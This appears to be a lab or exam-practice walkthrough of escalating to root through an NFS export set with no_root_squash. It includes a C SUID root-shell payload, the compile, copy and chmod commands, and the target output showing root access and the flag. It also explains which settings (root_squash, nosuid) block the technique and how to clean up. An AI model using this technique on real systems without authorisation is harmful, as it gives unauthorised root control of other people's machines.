# 07 — A root-owned SUID binary

`no_root_squash` means a file written to the export by Kali's root is owned by the target's root. Add
the SUID bit and the target has a root binary that any local user can run.

## 7.1 The payload

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(void)
{
    setuid(0);
    setgid(0);
    system("/bin/bash");
    return 0;
}
```

`setuid(0)` and `setgid(0)` set the **real** IDs as well as the effective ones. With the SUID bit the
effective UID is already 0; setting the real UID makes the shell start as root in every respect, which
avoids a shell that reports `uid=0` but cannot read `/root`.

## 7.2 Compile

```bash
kali@kali:~/exam$ gcc shell.c -o shell
kali@kali:~/exam$ file shell
```

```text
shell: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=[redacted], for GNU/Linux 3.2.0, not stripped
```

It must be compiled for the target's architecture — `x86-64` here, matching the Ubuntu host.

## 7.3 Place it on the export as root

```bash
kali@kali:~/exam$ sudo cp shell /mnt/nfs/shell
kali@kali:~/exam$ ls -l /mnt/nfs/shell
```

```text
-rwxr-xr-x 1 root root 16112 Jul 21 20:19 /mnt/nfs/shell
```

The owner is `root`, not `kali` and not `nobody`. That is `no_root_squash` working: the write came
from a UID-0 process on the client and the server stored it as UID 0.

## 7.4 Set the SUID bit

```bash
kali@kali:~/exam$ sudo chmod +s /mnt/nfs/shell
kali@kali:~/exam$ ls -l /mnt/nfs/shell
```

```text
-rwsr-sr-x 1 root root 16112 Jul 21 20:19 /mnt/nfs/shell
```

The `s` in the owner-execute position is the SUID bit; the `s` in the group position is SGID. Both
matter here because the payload calls both `setuid(0)` and `setgid(0)`.

## 7.5 Run it on the target

Back in the SSH session:

```bash
matt@oscp:~$ ls -l /usr/upload/shell
```

```text
-rwsr-sr-x 1 root root 16112 Jul 21 20:19 /usr/upload/shell
```

The same inode, seen from the server: root-owned, SUID, in a directory `matt` can execute from.

```bash
matt@oscp:~$ /usr/upload/shell
root@oscp:~# id
```

```text
uid=0(root) gid=0(root) groups=0(root),1001(adm)
```

```bash
root@oscp:~# cat /root/proof.txt
```

```text
[redacted]
```

## 7.6 The flag

| Host | File | Value |
|---|---|---|
| `172.16.97.110` | `/root/proof.txt` | `[redacted]` |

Both halves of the box are done: `local.txt` as `matt`, `proof.txt` as root.

## 7.7 Why it works — and what would stop it

| Condition | Effect |
|---|---|
| `no_root_squash` on the export | the copied binary is owned by the server's root |
| SUID bit set over the mount | the bit is stored on the server's filesystem, not stripped by NFS |
| export mounted without `nosuid` | the kernel honours the bit when the file is executed |
| a filesystem mounted `nosuid` | SUID is ignored — this path fails regardless of ownership |
| `root_squash` (default) | the binary would be owned by `nobody`; SUID would give `nobody`, not root |

The chain has no exploit code and no CVE. It is a file permission granted by a mount option:

```text
export option  →  file owner  →  SUID bit  →  root shell
```

## 7.8 Cleanup

The binary stays in `/usr/upload` until it is removed, and it is a root shell for anyone on the box.
After capturing the flag:

```bash
root@oscp:~# rm -f /usr/upload/shell
root@oscp:~# exit
```

```bash
kali@kali:~/exam$ sudo umount /mnt/nfs
kali@kali:~/exam$ exit
```

Removing the SUID binary and closing the tunnel leaves the host as it was found, apart from the
`insecure` token added to `/etc/exports` — which is the misconfiguration that made the box solvable
and should be reverted by the owner.

---

**Back to:** [`README.md`](README.md)
